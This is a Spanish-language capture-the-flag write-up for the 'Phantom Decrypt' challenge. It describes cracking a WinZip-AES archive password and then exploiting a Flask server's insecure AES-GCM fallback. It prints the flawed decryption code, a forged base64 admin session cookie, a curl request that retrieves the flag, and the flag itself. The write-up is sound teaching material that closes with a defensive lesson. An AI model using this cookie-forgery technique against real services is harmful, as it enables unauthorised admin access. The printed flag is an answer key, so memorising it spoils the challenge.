# Phantom Decrypt — Write-up

- **CTF:** FluidAttacks CTF 2026
- **Categoría:** Cryptography · **Dificultad:** Medium
- **Flag:** `flag{b067f0bc0a47b284}`

## Enunciado

> SecureVault guards its sessions with AES-GCM. The recovery key lives in the admin
> dashboard, where only admins can see it. Naturally.

Se entrega un ZIP con el código fuente del servidor.

## 1. Abrir el ZIP cifrado

El archivo adjunto es un ZIP protegido con **WinZip AES-256** (método de compresión 99),
que `unzip` no soporta. En WinZip-AES la verificación de contraseña se hace contra un
valor de 2 bytes derivado con **PBKDF2-HMAC-SHA1**, de modo que se puede probar
contraseñas usando solo `hashlib` de la stdlib, sin descifrar el contenido.

Crackeando contra `rockyou.txt`, la contraseña aparece rápido:

```
contraseña del ZIP = infected
```

El descifrado del contenido (AES-256-CTR, variante WinZip con contador little-endian
desde 1, seguido de inflate) revela `app.py`: un servidor Flask llamado "SecureVault".

## 2. La vulnerabilidad: fallback inseguro de sesión

Las cookies de sesión se cifran con AES-GCM correctamente. El problema está en el
descifrado:

```python
def decrypt_session(cookie):
    try:
        # ... AES-GCM auténtico (requiere la SECRET_KEY del servidor) ...
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return json.loads(plaintext)
    except Exception:
        # FALLBACK: si el GCM falla, confía en la cookie como base64(JSON)
        session_data = json.loads(base64.b64decode(cookie))   # <-- sin cifrar ni firmar
        return session_data
```

Si la verificación GCM lanza una excepción, el servidor interpreta la cookie como un
simple `base64(JSON)` **sin autenticación**. Y el dashboard entrega la flag cuando
`session_data["role"] == "admin"`:

```python
if role == "admin":
    flag_section = f"<p><b>Admin Recovery Key:</b> {FLAG}</p>"
```

No necesitamos la `SECRET_KEY`: basta con enviar una cookie que **no** sea un blob GCM
válido para caer en el fallback y controlar el `role`.

## 3. Explotación

Forjamos una cookie que es base64 de un JSON con rol admin:

```
session_token = base64('{"user":"admin","role":"admin"}')
              = eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ==
```

```bash
curl -s https://<target>/dashboard \
  -H 'Cookie: session_token=eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ=='
```

El HTML de respuesta incluye:

```
Admin Recovery Key: flag{b067f0bc0a47b284}
```

## Lección

Un buen esquema criptográfico (AES-GCM) queda anulado por un `except` que degrada a
datos no autenticados. Nunca uses un fallback que confíe en entrada del cliente cuando
la verificación de integridad falla: trata el fallo de descifrado como un rechazo, no
como una vía alternativa.
